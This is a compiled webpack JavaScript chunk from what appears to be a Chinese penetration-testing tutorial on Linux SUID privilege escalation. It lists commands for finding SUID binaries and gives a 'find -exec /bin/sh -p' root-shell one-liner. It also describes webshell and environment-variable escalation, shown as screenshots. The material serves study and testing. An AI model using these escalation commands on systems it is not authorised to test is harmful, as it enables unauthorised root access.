(window.webpackJsonp=window.webpackJsonp||[]).push([[33],{1021:function(s,t,a){s.exports=a.p+"assets/img/image-20220531145004731.cf88815f.png"},1022:function(s,t,a){s.exports=a.p+"assets/img/image-20220531150723350.774f435e.png"},1023:function(s,t,a){s.exports=a.p+"assets/img/image-20220531151918257.11274dbd.png"},1024:function(s,t,a){s.exports=a.p+"assets/img/image-20220531152916676.e4d57e7e.png"},1025:function(s,t,a){s.exports=a.p+"assets/img/image-20220531153303027.ce00d7c2.png"},1026:function(s,t,a){s.exports=a.p+"assets/img/image-20220531153753534.de3ca48b.png"},1027:function(s,t,a){s.exports=a.p+"assets/img/image-20220531171136888.ff2c4b39.png"},1028:function(s,t,a){s.exports=a.p+"assets/img/image-20220531171451027.c548d3c9.png"},2771:function(s,t,a){"use strict";a.r(t);var e=a(75),n=Object(e.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"suid"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#suid"}},[s._v("#")]),s._v(" SUID")]),s._v(" "),e("p",[s._v("SUID可以让调用者以文件拥有者的身份运行该文件, 当在渗透过程中发现带有其他用户SUID权限的可执行文件服务或进程时，可以利用存在错误的权限配置获取其他用户或ROOT的权限")]),s._v(" "),e("h2",{attrs:{id:"可执行文件提权"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#可执行文件提权"}},[s._v("#")]),s._v(" 可执行文件提权")]),s._v(" "),e("div",{staticClass:"language-sh line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" / -user root -perm /4000 "),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("/dev/null\n"),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" / -perm -u"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("s -type f "),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("/dev/null\n"),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" / -type f -name "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'*.txt'")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("/dev/null\n"),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" / -user root -perm -4000 -exec "),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" -ldb "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /tmp/suid\ngetcap -r / "),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("/dev/null\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1021),alt:"image-20220531145004731"}})]),s._v(" "),e("p",[s._v("创建新的用户 "),e("code",[s._v("user1")]),s._v("，使用 Root用户给 find命令加上 SUID权限，当登陆 user1 查看该命令时，可执行文件所有者为 Root，当 "),e("code",[s._v("user1")]),s._v(" 调用该命令时，实际调用身份为 "),e("code",[s._v("Root")])]),s._v(" "),e("div",{staticClass:"language-sh line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("user1@i-v0nrmv9j:~$ "),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" /usr/bin/find -all\n-rwsr-xr-x "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root root "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("199304")]),s._v(" Oct "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("31")]),s._v("  "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("2018")]),s._v(" /usr/bin/find\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),s._v(" "),e("a-alert",{attrs:{type:"success",message:"",description:"Linux 提权工具: https://gtfobins.github.io/",showIcon:""}}),s._v(" "),e("br"),s._v(" "),e("p",[e("img",{attrs:{src:a(1022),alt:"image-20220531150723350"}})]),s._v(" "),e("div",{staticClass:"language-sh line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v(" -exec /bin/sh -p "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" -quit\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1023),alt:"image-20220531151918257"}})]),s._v(" "),e("h2",{attrs:{id:"服务相关提权"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#服务相关提权"}},[s._v("#")]),s._v(" 服务相关提权")]),s._v(" "),e("p",[s._v("SUID权限与Web服务相关时, 这里以Root用户开启一个PHP Web服务器")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1024),alt:"image-20220531152916676"}})]),s._v(" "),e("p",[e("img",{attrs:{src:a(1025),alt:"image-20220531153303027"}})]),s._v(" "),e("p",[s._v("这里的PHP Web服务由于是Root权限开启的进程，我们可以通过在该Web目录写入 Webshell 命令执行获取Root权限")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1026),alt:"image-20220531153753534"}})]),s._v(" "),e("h2",{attrs:{id:"利用变量提权"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#利用变量提权"}},[s._v("#")]),s._v(" 利用变量提权")]),s._v(" "),e("p",[s._v("部分脚本中存在获取系统变量来执行时，如果变量可控且为SUID，我们就可以通过该脚本获取Root权限")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1027),alt:"image-20220531171136888"}})]),s._v(" "),e("p",[s._v("这里简单编写了一个例子，使用 env 中的变量 cmd 来执行命令 /bin/sh 获取可交互 Shell "),e("code",[s._v("(真实渗透中只需要注意SUID权限的可执行脚本是否有可控ENV变量)")])]),s._v(" "),e("p",[e("img",{attrs:{src:a(1028),alt:"image-20220531171451027"}})])],1)}),[],!1,null,null,null);t.default=n.exports}}]);